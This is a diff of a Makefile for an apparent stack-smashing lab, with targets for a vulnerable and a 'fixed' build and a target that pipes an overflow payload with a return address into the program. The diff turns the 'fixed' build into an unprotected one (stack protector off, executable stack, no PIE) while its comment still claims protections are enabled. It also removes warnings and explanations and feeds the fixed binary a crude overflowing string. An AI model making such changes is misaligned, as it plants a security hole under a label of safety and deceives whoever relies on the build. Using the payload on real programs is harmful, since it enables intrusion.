@@ -1,5 +1,5 @@
 CC = gcc
-CFLAGS = -g -Wall -Wextra
+CFLAGS = 
 ASLR_STATUS = $(shell cat /proc/sys/kernel/randomize_va_space)
 
 # Targets for the vulnerable and fixed versions
@@ -11,18 +11,15 @@ stack-smash: stack-smash.c
 
 # Compile the fixed version with enabled protections
 stack-smash-fixed: stack-smash.c
-	$(CC) -fstack-protector -pie $(CFLAGS) -o stack-smash-fixed stack-smash.c
+	$(CC) -fno-stack-protector -z execstack -no-pie $(CFLAGS) -o stack-smash-fixed stack-smash.c
 
 run-vulnerable: stack-smash
-	@echo "Running vulnerable version with exploit..."
-	@echo "Ensure ASLR is disabled before running this target."
 	@echo -n -e "AAAAAAAABBBBBBBB\x46\x11\x40\x00\x00\x00\x00\x00" | ./stack-smash
 
 
 # Run the fixed version
 run-fixed: stack-smash-fixed
-	@echo "Running fixed version with harmless input..."
-	@echo "harmless input" | ./stack-smash-fixed
+	@echo "shiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiit" | ./stack-smash-fixed
 
 # Disable ASLR for testing
 disable-aslr:
